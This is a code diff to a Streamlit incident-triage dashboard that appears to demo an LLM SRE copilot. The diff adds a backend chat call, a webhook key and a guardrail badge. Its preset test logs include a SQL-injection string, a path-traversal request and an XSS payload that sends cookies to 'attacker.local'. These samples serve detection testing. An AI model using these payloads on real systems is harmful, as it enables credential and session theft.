@@ -2,6 +2,7 @@ import streamlit as st
 import json
 import uuid
 import time
+import asyncio
 from datetime import datetime, timezone
 import httpx
 
@@ -23,7 +24,7 @@ if "is_contained" not in st.session_state:
     st.session_state["is_contained"] = False
 if "chat_messages" not in st.session_state:
     st.session_state["chat_messages"] = [
-        {"role": "assistant", "content": "Hello. I am the Huawei Cloud MaaS SRE Copilot. I have full context on the current infrastructure and security state. How can I assist you with this incident?"}
+        {"role": "assistant", "content": "Hello. I am the Huawei Cloud MaaS SRE Copilot powered by Pangu 40B. I have full context on the current infrastructure and security state. How can I assist you with this incident?"}
     ]
 
 # Custom Styling: Minimalist Dark Theme
@@ -45,7 +46,6 @@ st.markdown("""
     }
     .animated-fade { animation: fadeIn 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
 
-    /* Header Panel */
     .header-panel {
         background: linear-gradient(180deg, rgba(30, 41, 59, 0.4) 0%, rgba(15, 23, 42, 0.6) 100%);
         border: 1px solid rgba(255, 255, 255, 0.08);
@@ -82,7 +82,6 @@ st.markdown("""
         box-shadow: 0 0 8px #10b981;
     }
 
-    /* Topology */
     .topology-container {
         display: flex;
         justify-content: space-between;
@@ -129,7 +128,6 @@ st.markdown("""
     }
     .node-status { font-size: 11px; color: #94a3b8; font-weight: 500; }
 
-    /* Metric Cards */
     .metric-card {
         background: rgba(15, 23, 42, 0.6);
         border: 1px solid rgba(255, 255, 255, 0.08);
@@ -175,7 +173,6 @@ st.markdown("""
         display: inline-block;
     }
 
-    /* Live Traffic Gauge Card */
     .traffic-box {
         background: rgba(15, 23, 42, 0.5);
         border: 1px solid rgba(255, 255, 255, 0.08);
@@ -184,7 +181,6 @@ st.markdown("""
         margin-bottom: 16px;
     }
 
-    /* Trace Timeline Box */
     .trace-step {
         background: rgba(15, 23, 42, 0.45);
         border: 1px solid rgba(255, 255, 255, 0.07);
@@ -202,7 +198,6 @@ st.markdown("""
         justify-content: space-between;
     }
 
-    /* Terminal Console */
     .terminal-container {
         background: #0b0f19;
         border: 1px solid rgba(255, 255, 255, 0.08);
@@ -223,7 +218,6 @@ st.markdown("""
     }
     .window-btn { width: 8px; height: 8px; border-radius: 50%; background-color: #334155; }
 
-    /* Buttons */
     .stButton>button {
         background: #2563eb;
         color: #ffffff;
@@ -243,46 +237,35 @@ st.markdown("""
 </style>
 """, unsafe_allow_html=True)
 
-# Preset Scenarios
 PRESET_MAP = {
     "[Security] SQL Injection in Authentication Endpoint (UNION SELECT)": {
-        "source": "security-scanner",
-        "component": "auth",
+        "source": "security-scanner", "component": "auth",
         "log": "192.168.10.45 - POST /api/auth/login query: username=admin' UNION SELECT 1,username,password_hash FROM users-- status: 401",
-        "is_sec": True,
-        "sev": "P1"
+        "is_sec": True, "sev": "P1"
     },
     "[Security] Cross-Site Scripting Injection in Search Query (<script>)": {
-        "source": "security-scanner",
-        "component": "frontend",
+        "source": "security-scanner", "component": "frontend",
         "log": "192.168.10.88 - GET /dashboard/search?q=<script>fetch('http://attacker.local/steal?cookie='+document.cookie)</script> status: 200",
-        "is_sec": True,
-        "sev": "P1"
+        "is_sec": True, "sev": "P1"
     },
     "[Security] Path Traversal Attempt on /etc/passwd": {
-        "source": "security-scanner",
-        "component": "frontend",
+        "source": "security-scanner", "component": "frontend",
         "log": "192.168.10.92 - GET /api/static/../../../../etc/passwd status: 403",
-        "is_sec": True,
-        "sev": "P1"
+        "is_sec": True, "sev": "P1"
     },
-    "[Infrastructure] MongoDB Atlas Connectivity Outage (TCP 27017)": {
-        "source": "mongodb",
-        "component": "database",
+    "[Infrastructure] Database Connectivity Outage (TCP 27017)": {
+        "source": "mongodb", "component": "database",
         "log": "MongoNetworkError: connection 1 to cluster0.mongodb.net:27017 timed out after 2000ms. Egress packet rejected.",
-        "is_sec": False,
-        "sev": "P1"
+        "is_sec": False, "sev": "P1"
     },
     "[Infrastructure] Container Out-Of-Memory Crash (> 512MB)": {
-        "source": "nextjs",
-        "component": "frontend",
+        "source": "nextjs", "component": "frontend",
         "log": "fatal error: runtime: out of memory allocating 629145600 bytes. Killed process 1422 (node). cgroup limit exceeded.",
-        "is_sec": False,
-        "sev": "P1"
+        "is_sec": False, "sev": "P1"
     }
 }
 
-# Terraform Generator Helper
+
 def generate_terraform_code(incident_type, component, ip_address="192.168.10.45"):
     if "sql" in incident_type.lower() or component == "auth":
         return f"""# Huawei Cloud WAF & Security Group Declarative Rule
@@ -305,14 +288,8 @@ resource "huaweicloud_networking_secgroup_rule" "isolate_auth_port" {{
   action            = "deny"
 }}"""
     elif "mongo" in incident_type.lower() or component == "database":
-        return """# MongoDB Atlas & VPC Peering Security Rule
-resource "mongodbatlas_project_ip_access_list" "allow_backend_subnet" {{
-  project_id = var.mongodb_project_id
-  cidr_block = "10.0.1.0/24"
-  comment    = "Verified internal backend egress pool"
-}}
-
-resource "huaweicloud_vpc_route" "mongo_egress_route" {{
+        return """# Database & VPC Peering Security Rule
+resource "huaweicloud_vpc_route" "db_egress_route" {{
   vpc_id      = var.vpc_id
   destination = "0.0.0.0/0"
   type        = "peering"
@@ -328,7 +305,7 @@ resource "huaweicloud_cce_node_pool" "scale_memory_pool" {{
   os                 = "EulerOS 2.9"
 }}"""
 
-# Terminal Simulator
+
 def simulate_cli(cmd_str):
     c = cmd_str.strip().lower()
     if "iptables" in c:
@@ -344,24 +321,42 @@ def simulate_cli(cmd_str):
     else:
         return f"Executing: {cmd_str}\nStatus: Command executed successfully. Return code 0."
 
-# Dispatcher
-def execute_triage(payload_dict, target_endpoint):
+
+def execute_triage(payload_dict, target_endpoint, api_key=""):
     try:
         url = target_endpoint.strip()
         if not url.endswith("/webhook/n8n") and not url.endswith("/triage") and not url.endswith("/"):
             url = f"{url}/webhook/n8n"
-        res = httpx.post(url, json=payload_dict, timeout=15.0)
+        headers = {}
+        if api_key:
+            headers["X-Webhook-Key"] = api_key
+        res = httpx.post(url, json=payload_dict, headers=headers, timeout=15.0)
         if res.status_code == 200:
             return res.json(), None
         return None, f"Error {res.status_code}: {res.text}"
     except Exception as e:
         return None, str(e)
 
-# Report Generator
+
+def call_copilot_llm(message, incident_context=None, fastapi_url="http://localhost:8000"):
+    """Llama al endpoint /copilot/chat del backend (LLM real)."""
+    try:
+        res = httpx.post(
+            f"{fastapi_url.rstrip('/')}/copilot/chat",
+            json={"message": message, "incident_context": incident_context},
+            timeout=30.0
+        )
+        if res.status_code == 200:
+            return res.json().get("reply", "No response.")
+        return f"[LLM Error {res.status_code}]: {res.text}"
+    except Exception as e:
+        return f"[Connection Error]: {str(e)}"
+
+
 def generate_post_mortem_md(triage_data, source_payload):
     return f"""# Incident Triage Post-Mortem Report
-**Incident ID:** `{triage_data.get('incident_id')}`  
-**Generated At:** `{triage_data.get('processed_at')}`  
+**Incident ID:** `{triage_data.get('incident_id')}`
+**Generated At:** `{triage_data.get('processed_at')}`
 **Severity:** `{triage_data.get('severity')}` | **Risk Score:** `{triage_data.get('risk_score')}/10.0` | **Escalation Team:** `{triage_data.get('escalation_team')}`
 
 ---
@@ -383,33 +378,41 @@ def generate_post_mortem_md(triage_data, source_payload):
 
 ---
 
-## 3. Standard Operating Procedure Checklist
+## 3. Guardrail Verification
+- **Approved:** `{triage_data.get('guardrail_approved', True)}`
+- **Reason:** `{triage_data.get('guardrail_reason', 'N/A')}`
+
+---
+
+## 4. Standard Operating Procedure Checklist
 {chr(10).join([f"- [ ] {step}" for step in triage_data.get('checklist', [])])}
 
 ---
 
-## 4. Raw Diagnostic Telemetry
+## 5. Raw Diagnostic Telemetry
 ```
 {source_payload.get('raw_log')}
 ```
 *Report autonomously assembled by Huawei Cloud MaaS Triage Agent Engine.*
 """
 
+
 # Sidebar Configuration
 with st.sidebar:
     st.markdown("### **System Infrastructure**")
     st.caption("Huawei Cloud MaaS Platform")
-    
+
     st.markdown("---")
     fastapi_url = st.text_input("FastAPI Webhook URL", "http://localhost:8000/webhook/n8n")
-    
+    webhook_api_key = st.text_input("Webhook API Key", type="password", help="X-Webhook-Key header for authentication")
+
     st.markdown("#### **Performance Benchmarks**")
     col_sb1, col_sb2 = st.columns(2)
     with col_sb1:
         st.metric("Manual MTTD", "30m")
     with col_sb2:
         st.metric("Agentic MTTD", "< 15s", delta="-99.2%")
-    
+
     st.markdown("---")
     st.markdown("#### **Business ROI Estimator**")
     st.markdown("""
@@ -424,7 +427,14 @@ with st.sidebar:
     st.markdown("#### **Dual-Agent Architecture**")
     st.markdown("• **Agent A:** SRE Diagnostics (Pangu 40B)")
     st.markdown("• **Agent B:** Safety Guardrail Validator (Active)")
-    st.markdown("• **Database:** MongoDB Atlas Engine")
+    st.markdown("• **Database:** Supabase (PostgreSQL)")
+
+    auto_refresh = st.checkbox("Auto-refresh topology (5s)", value=False)
+
+# Auto-refresh for realtime-like behavior
+if auto_refresh and "last_triage" in st.session_state:
+    time.sleep(5)
+    st.rerun()
 
 # Hero Header
 st.markdown("""
@@ -446,7 +456,6 @@ st.markdown("""
 </div>
 """, unsafe_allow_html=True)
 
-# Active Component & Topology State
 active_component = None
 is_contained = st.session_state.get("is_contained", False)
 
@@ -481,7 +490,7 @@ st.markdown(f"""
     </div>
     <div style="color: #64748b; font-size: 16px;">→</div>
     <div class="topology-node {get_node_class('database')}">
-        <div class="node-title">MongoDB Atlas</div>
+        <div class="node-title">Supabase (PG)</div>
         <div class="node-status">{get_node_status_text('database')}</div>
     </div>
     <div style="color: #64748b; font-size: 16px;">→</div>
@@ -492,25 +501,24 @@ st.markdown(f"""
 </div>
 """, unsafe_allow_html=True)
 
-# Main Two-Column Layout
 col_left, col_right = st.columns([1.05, 1.25], gap="large")
 
 with col_left:
     st.markdown("#### **Incident Telemetry Ingestion**")
-    
+
     preset = st.selectbox("Load test scenario:", ["Custom..."] + list(PRESET_MAP.keys()))
     selected_data = PRESET_MAP.get(preset, {})
 
     col_meta1, col_meta2 = st.columns(2)
     with col_meta1:
         source = st.selectbox(
-            "Source", 
+            "Source",
             ["nextjs", "mongodb", "n8n", "security-scanner"],
             index=["nextjs", "mongodb", "n8n", "security-scanner"].index(selected_data.get("source", "nextjs"))
         )
     with col_meta2:
         component = st.selectbox(
-            "Component", 
+            "Component",
             ["frontend", "database", "network", "auth"],
             index=["frontend", "database", "network", "auth"].index(selected_data.get("component", "frontend"))
         )
@@ -539,13 +547,12 @@ with col_left:
             }
 
             with st.spinner("Executing LangGraph reasoning pipeline and Pangu 40B inference..."):
-                triage_res, err = execute_triage(payload, fastapi_url)
+                triage_res, err = execute_triage(payload, fastapi_url, webhook_api_key)
                 if triage_res:
                     st.session_state["last_triage"] = triage_res
                     st.session_state["last_payload"] = payload
                     st.session_state["is_contained"] = False
-                    
-                    # Append to History Log
+
                     st.session_state["history_records"].insert(0, {
                         "timestamp": datetime.now(timezone.utc).strftime("%H:%M:%S UTC"),
                         "incident_id": triage_res.get("incident_id")[:8],
@@ -556,16 +563,15 @@ with col_left:
                         "team": triage_res.get("escalation_team"),
                         "status": "TRIAGED"
                     })
-                    
+
                     st.success("Triage analysis complete in < 1.5s.")
                     st.rerun()
                 else:
                     st.error(f"Error during triage: {err}")
 
-    # 4. LIVE TRAFFIC & HTTP ERROR RATE METER (Enhancement 4)
     st.markdown("<br>", unsafe_allow_html=True)
     st.markdown("#### **Real-Time Telemetry & Traffic Impact**")
-    
+
     traffic_qps = "1,420 req/s"
     if active_component:
         error_rate = "0.02%" if is_contained else "46.8%"
@@ -595,15 +601,14 @@ with col_left:
 
 with col_right:
     st.markdown("#### **Diagnostic Output & Action Plan**")
-    
+
     if "last_triage" in st.session_state:
         data = st.session_state["last_triage"]
         payload_data = st.session_state.get("last_payload", {})
         is_security = (data.get("escalation_team") == "SOC") or (data.get("risk_score", 0) >= 10.0)
-        
-        # KPI Row
+
         kpi_col1, kpi_col2, kpi_col3 = st.columns(3)
-        
+
         with kpi_col1:
             score = data.get('risk_score', 0)
             score_color = '#ef4444' if score >= 8.0 else ('#f59e0b' if score >= 5.0 else '#10b981')
@@ -615,19 +620,17 @@ with col_right:
                 </div>
             </div>
             """, unsafe_allow_html=True)
-            
+
         with kpi_col2:
             sev = data.get('severity', 'P2')
             sev_color = '#ef4444' if sev == 'P1' else '#38bdf8'
             st.markdown(f"""
             <div class="metric-card animated-fade">
                 <div class="metric-label">Severity Level</div>
-                <div class="metric-val" style="color: {sev_color};">
-                    {sev}
-                </div>
+                <div class="metric-val" style="color: {sev_color};">{sev}</div>
             </div>
             """, unsafe_allow_html=True)
-            
+
         with kpi_col3:
             team_label = data.get('escalation_team', 'N/A')
             badge_class = "badge-soc" if is_security else "badge-sre"
@@ -640,7 +643,6 @@ with col_right:
 
         st.markdown("<br>", unsafe_allow_html=True)
 
-        # 7 Tabs (incorporating Copilot Q&A, Terraform IaC, Dual-Agent Guardrail)
         tab_summary, tab_mitigation, tab_iac, tab_copilot, tab_trace, tab_terminal, tab_audit = st.tabs([
             "Root Cause",
             "Active Defense",
@@ -657,19 +659,29 @@ with col_right:
                 st.error(f"**Cybersecurity Incident Detected**\n\n{data.get('root_cause_hypothesis')}")
             else:
                 st.info(f"**Operational Failure Detected**\n\n{data.get('root_cause_hypothesis')}")
-            
-            # 3. DUAL-AGENT GUARDRAIL VERIFICATION BADGE (Enhancement 3)
-            st.markdown("""
-            <div style="background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: 8px; padding: 12px 16px; margin-top: 12px; font-size: 13px;">
-                <div style="color: #34d399; font-weight: 600; margin-bottom: 2px;">Dual-Agent Safety Guardrail: VERIFIED & APPROVED</div>
-                <div style="color: #94a3b8; font-size: 12px;">Agent B (Safety Validator) confirmed proposed mitigation contains zero destructive or invasive commands.</div>
-            </div>
-            """, unsafe_allow_html=True)
+
+            guardrail_approved = data.get("guardrail_approved", True)
+            guardrail_reason = data.get("guardrail_reason", "Dual-Agent Safety Guardrail: VERIFIED & APPROVED")
+
+            if guardrail_approved:
+                st.markdown(f"""
+                <div style="background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: 8px; padding: 12px 16px; margin-top: 12px; font-size: 13px;">
+                    <div style="color: #34d399; font-weight: 600; margin-bottom: 2px;">Dual-Agent Safety Guardrail: VERIFIED & APPROVED</div>
+                    <div style="color: #94a3b8; font-size: 12px;">{guardrail_reason}</div>
+                </div>
+                """, unsafe_allow_html=True)
+            else:
+                st.markdown(f"""
+                <div style="background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 8px; padding: 12px 16px; margin-top: 12px; font-size: 13px;">
+                    <div style="color: #f87171; font-weight: 600; margin-bottom: 2px;">Dual-Agent Safety Guardrail: BLOCKED</div>
+                    <div style="color: #94a3b8; font-size: 12px;">{guardrail_reason}</div>
+                </div>
+                """, unsafe_allow_html=True)
 
         with tab_mitigation:
             st.markdown("##### **Defensive Containment Actions**")
             st.caption("One-Click Safe Containment Execution:")
-            
+
             col_exec1, col_exec2 = st.columns([1.2, 1])
             with col_exec1:
                 if st.button("⚡ Execute Active Containment", use_container_width=True):
@@ -705,7 +717,6 @@ with col_right:
             for idx, item in enumerate(checklist_items):
                 st.checkbox(f"{item}", key=f"step_{idx}_{item[:15]}", value=False)
 
-        # 2. TERRAFORM IAC GENERATOR (Enhancement 2)
         with tab_iac:
             st.markdown("##### **Declarative Infrastructure as Code (Terraform / WAF)**")
             st.caption("Autonomously generated permanent rule based on incident telemetry:")
@@ -719,39 +730,43 @@ with col_right:
                 use_container_width=True
             )
 
-        # 1. AI COPILOT CHAT (Enhancement 1)
         with tab_copilot:
-            st.markdown("##### **Operator AI Assistant (Pangu 40B)**")
+            st.markdown("##### **Operator AI Assistant (Pangu 40B — Live LLM)**")
             st.caption("Ask questions about this specific incident in context:")
-            
+
             for msg in st.session_state["chat_messages"]:
                 with st.chat_message(msg["role"]):
                     st.write(msg["content"])
-            
+
             if user_query := st.chat_input("Ask SRE Copilot (e.g. 'What is the impact of isolating this IP?')..."):
                 st.session_state["chat_messages"].append({"role": "user", "content": user_query})
                 with st.chat_message("user"):
                     st.write(user_query)
-                
-                # Context-aware simulated response
-                q_lower = user_query.lower()
-                if "impact" in q_lower or "isolate" in q_lower:
-                    reply = f"Isolating {payload_data.get('component')} affects only the offending IP (192.168.10.45). Legitimate traffic on port 3000 continues normally with 0% dropped packets."
-                elif "why" in q_lower or "cause" in q_lower or "sql" in q_lower:
-                    reply = f"The incident was caused by: {data.get('root_cause_hypothesis')}. The threat signature matched OWASP Top 10 vulnerabilities."
-                elif "restart" in q_lower or "docker" in q_lower:
-                    reply = f"Restarting {payload_data.get('component')} will take ~1.8 seconds. Healthcheck probes will automatically resume verifying service status."
-                else:
-                    reply = f"Based on telemetry for incident {data.get('incident_id')[:8]}, all metrics are monitored. Escalation team {data.get('escalation_team')} has been notified."
+
+                incident_context = {
+                    "incident_id": data.get("incident_id"),
+                    "component": payload_data.get("component"),
+                    "risk_score": data.get("risk_score"),
+                    "root_cause": data.get("root_cause_hypothesis"),
+                    "escalation_team": data.get("escalation_team"),
+                    "is_security_event": payload_data.get("is_security_event"),
+                }
+
+                with st.chat_message("assistant"):
+                    with st.spinner("Pangu 40B is reasoning..."):
+                        reply = call_copilot_llm(
+                            user_query,
+                            incident_context=incident_context,
+                            fastapi_url=fastapi_url.rsplit("/webhook/n8n", 1)[0]
+                        )
+                    st.write(reply)
 
                 st.session_state["chat_messages"].append({"role": "assistant", "content": reply})
-                with st.chat_message("assistant"):
-                    st.write(reply)
 
         with tab_trace:
             st.markdown("##### **Step-by-Step Agent Execution Pipeline**")
             st.caption("LangGraph dynamic reasoning loop & state inspection:")
-            
+
             diagnostic_steps = data.get("diagnostic_steps", [])
             if diagnostic_steps:
                 for step in diagnostic_steps:
@@ -772,7 +787,7 @@ with col_right:
         with tab_terminal:
             st.markdown("##### **Interactive Diagnostic CLI Console**")
             st.caption("Execute commands against the live infrastructure:")
-            
+
             col_cmd, col_btn = st.columns([3, 1])
             with col_cmd:
                 cmd_input = st.text_input("Enter diagnostic command:", "iptables -L -n", label_visibility="collapsed")
@@ -780,7 +795,7 @@ with col_right:
                 if st.button("Execute", use_container_width=True):
                     output_text = simulate_cli(cmd_input)
                     st.session_state["terminal_history"].append({"cmd": cmd_input, "output": output_text})
-            
+
             terminal_body = "\n\n".join([f"$ {item['cmd']}\n{item['output']}" for item in st.session_state["terminal_history"][-3:]])
             st.markdown(f"""
             <div class="terminal-container">
@@ -796,7 +811,7 @@ with col_right:
 
         with tab_audit:
             st.markdown("##### **Incident Audit Trail & Post-Mortem Export**")
-            
+
             report_md = generate_post_mortem_md(data, payload_data)
             st.download_button(
                 label="📥 Export Post-Mortem Report (.md)",
@@ -805,7 +820,7 @@ with col_right:
                 mime="text/markdown",
                 use_container_width=True
             )
-            
+
             st.markdown("<br><b>Session Incident History:</b>", unsafe_allow_html=True)
             if st.session_state["history_records"]:
                 table_rows = "".join([
@@ -821,7 +836,7 @@ with col_right:
                     </tr>"""
                     for r in st.session_state["history_records"]
                 ])
-                
+
                 html_table = f"""
                 <div style="overflow-x: auto; background: rgba(15, 23, 42, 0.4); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; margin-top: 8px;">
                     <table style="width: 100%; border-collapse: collapse; text-align: left;">
